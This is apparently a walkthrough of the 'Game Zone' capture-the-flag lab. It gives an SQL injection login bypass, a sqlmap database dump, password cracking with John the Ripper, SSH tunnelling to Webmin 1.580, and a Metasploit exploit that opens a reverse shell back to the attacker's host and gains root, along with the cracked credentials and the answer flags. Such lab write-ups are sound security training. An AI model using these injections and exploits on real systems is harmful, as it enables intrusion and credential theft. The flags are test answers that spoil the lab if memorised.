# Game Zone - Easy

1. [Introduction](#introduction)
2. [Obtain access via SQLi](#obtain-access-via-sqli)
3. [Using SQLMap](#using-sqlmap)
4. [Cracking password with JTR](#cracking-password-with-jtr)
5. [Exposing services with reverse SSH tunnels?](#exposing-services-with-reverse-ssh-tunnels)
6. [Privilege Escalation with Metasploit](#privilege-escalation-with-metasploit)

## Introduction

```markdown
1. What is the name of the large cartoon avatar holding a sniper on the forum? - Agent 47
```

## Obtain access via SQLi

```markdown
We can login using SQLi

Username: ' or 1=1 -- -

We can leave the password field blank and login.
```

```markdown
1. When you've logged in, what page do you get redirected to? - portal.php
```

## Using SQLMap

```shell
sqlmap -r portalreq.txt --dbms=mysql --dump
#uses intercepted request to dump database
```

```markdown
As given, we have to use Burp Suite to capture the POST request in portal.php, and save the request to a file.

Then, we have to pass this file into SQLMap
```

```markdown
1. In the users table, what is the hashed password? - ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

2. What was the username associated with the hashed password? - agent47

3. What was the other table name? - post
```

## Cracking password with JTR

```shell
john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt gamehash.txt
#cracks the hash found in previous step

#we can try ssh login using this password
ssh agent47@10.10.139.234

cat user.txt
```

```markdown
1. What is the de-hashed password? - videogamer124

2. What is the user flag? - 649ac17b1480ac13ef1e4fa579dac95c
```

## Exposing services with reverse SSH tunnels?

```shell
#view socket connections in remote machine
ss -tulpn

#in host machine
ssh -L 10000:localhost:10000 agent47@10.10.139.234

#now we can go to localhost:10000 for remote access to webserver
```

```markdown
1. How many TCP sockets are running? - 5

2. What is the name of the exposed CMS? - Webmin

3. What is the CMS version? - 1.580
```

## Privilege Escalation with Metasploit

```shell
msfconsole

search 1.580
#we can also search for webmin

use exploit/unix/webapp/webmin_show_cgi_exec

show options

set PASSWORD videogamer124

set RHOSTS 127.0.0.1
#since we are accessing webmin on localhost

set USERNAME agent47

set PAYLOAD cmd/unix/reverse

set LHOST 10.17.48.136

set SSL false

run
#gives root access

cd /root

cat root.txt
```

```markdown
1. What is the root flag? - a4b945830144bdd71908d12d902adeee
```
